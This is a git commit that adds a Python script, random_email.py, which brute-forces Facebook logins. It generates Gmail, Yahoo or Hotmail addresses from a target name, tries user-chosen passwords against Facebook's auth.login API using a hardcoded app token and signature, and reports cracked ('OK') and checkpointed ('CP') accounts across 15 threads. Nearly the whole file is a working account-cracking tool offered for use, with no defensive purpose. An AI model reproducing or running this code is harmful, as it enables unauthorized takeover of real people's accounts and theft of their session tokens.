3e681aae49949422a42d0af29b77344e3d3e6898
Dapunta ID <76211798+Dapunta@users.noreply.github.com>
2021-05-29 18:14:44 +0700

    Add files via upload

---
+++ random_email.py
@@ -0,0 +1,90 @@
+#!/usr/bin/python3
+#-*-coding:utf-8-*-
+# Created By Dapunta
+
+import requests,mechanize,bs4,sys,os,subprocess,uuid
+import requests,sys,random,time,re,base64,json
+import os, re, requests, concurrent.futures
+import premium
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from datetime import date
+from datetime import datetime
+current = datetime.now()
+
+p = "\x1b[0;37m" # putih
+m = "\x1b[0;31m" # merah
+h = "\x1b[0;32m" # hijau
+k = "\x1b[0;33m" # kuning
+b = "\x1b[0;34m" # biru
+u = "\x1b[0;35m" # ungu
+o = "\x1b[0;36m" # biru muda
+
+if ("linux" in sys.platform.lower()):
+
+        N = "\033[0m"
+        G = "\033[1;92m"
+        O = "\033[1;97m"
+        R = "\033[1;91m"
+else:
+
+        N = ""
+        G = ""
+        O = ""
+        R = ""
+
+def jalan(z):
+	for e in z + "\n":
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+
+def clear():
+	if " linux" in sys.platform.lower():
+		os.system("clear")
+	elif "win" in sys.platform.lower():
+		os.system("cls")
+	else:os.system("clear")
+
+def random_email():
+  data = []
+  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
+  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
+  list={
+    'g':'@gmail.com',
+    'y':'@yahoo.com',
+    'h':'@hotmail.com'
+  }
+  exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
+  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
+  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
+  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
+  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
+    {th.submit(brute, user['user'], user['pw']): user for user in data}
+  input(k+"\n[ "+p+"Back"+k+" ]"+p)
+  exit(premium.menu())
+  
+def brute(user, passs):
+  try:
+    for pw in passs:
+      params={
+        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+        'format': 'JSON',
+        'sdk_version': '2',
+        'email': user,
+        'locale': 'en_US',
+        'password': pw,
+        'sdk': 'ios',
+        'generate_session_cookies': '1',
+        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+      }
+      api='https://b-api.facebook.com/method/auth.login'
+      response=requests.get(api, params=params)
+      if re.search('(EAAA)\w+', str(response.text)):
+        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
+        break
+      elif 'www.facebook.com' in response.json()['error_msg']:
+        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
+        break
+  except: pass
